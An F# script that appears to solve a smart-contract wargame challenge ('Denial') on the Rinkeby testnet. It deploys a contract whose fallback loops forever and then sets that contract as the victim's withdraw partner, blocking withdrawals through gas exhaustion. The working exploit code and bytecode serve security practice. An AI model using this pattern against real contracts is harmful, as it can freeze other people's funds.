#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env = createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// This was a tremendous pain in the ass to test, because Remix just hangs/crashes/goes unresponsive when trying to
// do a gas depletion loop. Hyper annoying. In the end, I just winged it and deployed.

// I'm reasonably certain this would work as a `receive()`-based attack, but since Remix is garbage at this, I can't
// tell...

(*
    contract Locker {
      fallback() external payable {
          while(true){}
      }
  }
*)

// my instance: 0x029396150651Fe752966aFbfeAe82Cb0c7c0B4Cb

let denialABI = """[{"inputs":[],"name":"contractBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"partner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_partner","type":"address"}],"name":"setWithdrawPartner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]""" |> ABI

let lockerBytecode = """6080604052600080546001600160a01b03191673029396150651fe752966afbfeae82cb0c7c0b4cb179055348015603557600080fd5b50603f8060436000396000f3fe60806040525b600556fea264697066735822122019d947478f12238785da6145ceacd7ef6435d4c7d1c536b8d8130bae49959a9764736f6c634300060c0033""" |> RawContractBytecode
let lockerABI = """[{"stateMutability":"payable","type":"fallback"}]""" |> ABI

prepareUndeployedContract env lockerBytecode None RINKEBY lockerABI |> Result.bind( deployEthContract env ZEROV) |> env.log Log

let denial = loadDeployedContract env "0x029396150651Fe752966aFbfeAe82Cb0c7c0B4Cb" RINKEBY denialABI |> bindDeployedContract |> List.head

txn denial (ByString "setWithdrawPartner") [Address "0x09514e71b95e906c9180729f84a9859b6b4c610c"] ZEROV |> env.log Log

